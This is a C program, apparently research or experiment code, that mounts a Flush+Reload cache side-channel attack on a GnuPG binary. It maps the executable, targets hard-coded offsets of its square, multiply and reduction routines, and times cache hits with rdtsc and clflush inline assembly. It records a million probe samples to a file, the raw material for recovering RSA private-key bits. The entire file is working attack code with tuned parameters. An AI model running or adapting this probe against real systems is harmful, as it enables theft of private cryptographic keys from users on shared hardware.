#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>


unsigned long probe(char *adrs) {
	volatile unsigned long time;
	asm __volatile__ (
			"  mfence				\n"
			"  lfence				\n"
			"  rdtsc				\n"
			"  lfence				\n"
			"  movl %%eax, %%esi	\n"
			"  movl (%1), %%eax		\n"
			"  lfence							\n"
			"  rdtsc							\n"
			"  subl %%esi, %%eax	\n"
			"  clflush 0(%1)			\n"
			: "=a" (time)
			: "c" (adrs)
			:  "%esi", "%edx");
	return time;
}
static __inline__ unsigned long long rdtsc(void)
{
	unsigned long long int x;
	__asm__ volatile (".byte 0x0f, 0x31" : "=A" (x));
	return x;
}

int main() {
	int fd;
	void *gpg_map;
	struct stat statbuf;
	fd = open("pgpg", O_RDONLY); // open gpg executable
	fstat(fd,&statbuf); // get filesize
	gpg_map = mmap(NULL,statbuf.st_size, PROT_READ, MAP_SHARED, fd, 0); // mmap gpg into memory
	if ((long long)gpg_map == -1) { // if error
		printf("Error: %d\n",errno);
		return -1;
	}

	//void *sqr_addr = gpg_map + 0xe787; // for protean
	//void *mult_addr = gpg_map + 0x76ea; // for protean
	//void *red_addr = gpg_map + 0x15703; // for protean
	void *sqr_addr = gpg_map + 0xe300; // for static
	void *mult_addr = gpg_map + 0x7277; // for static
	void *red_addr = gpg_map + 0x15289; // for static
	printf("gpg_map at: %p\n", gpg_map);
	printf("sqr_addr at: %p\n", sqr_addr);
	printf("mult_addr at: %p\n", mult_addr);
	printf("red_addr at: %p\n", red_addr);

	
	////////////////
	// Experiment //
	////////////////

	unsigned long long num_probes = 1000000; // change as needed
	unsigned int tick_interval = 750; // minimum tick interval
	unsigned long long threshold = 180; // ticks less than this indicate a cache hit
	unsigned short sqr_probes[num_probes]; // use shorts to save memory
	unsigned short mult_probes[num_probes]; // use shorts to save memory
	unsigned short red_probes[num_probes]; // use shorts to save memory
	unsigned long long now, then;

	now = rdtsc();
	for(int i=0; i<num_probes; i++) {
	//for(;;) {
		then = now;

		sqr_probes[i] = probe((char*)sqr_addr);
		mult_probes[i] = probe((char*)mult_addr);
		red_probes[i] = probe((char*)red_addr);
		
		while ((now-then) < tick_interval) { // while this interval is still ongoing
			for (int j=0; j<10; j++) {}; // spin 10 times
			now = rdtsc(); // is it time yet?
		}
	}
	// write out to file
	FILE *fd2 = fopen("output.txt","w");
	for (int i=0; i<num_probes; i++) {
		fprintf(fd2, "%u %u %u\n", sqr_probes[i], mult_probes[i], red_probes[i]);
	}
	fclose(fd2); // close output file
	close(fd); // close gpg file

	return 0;
}
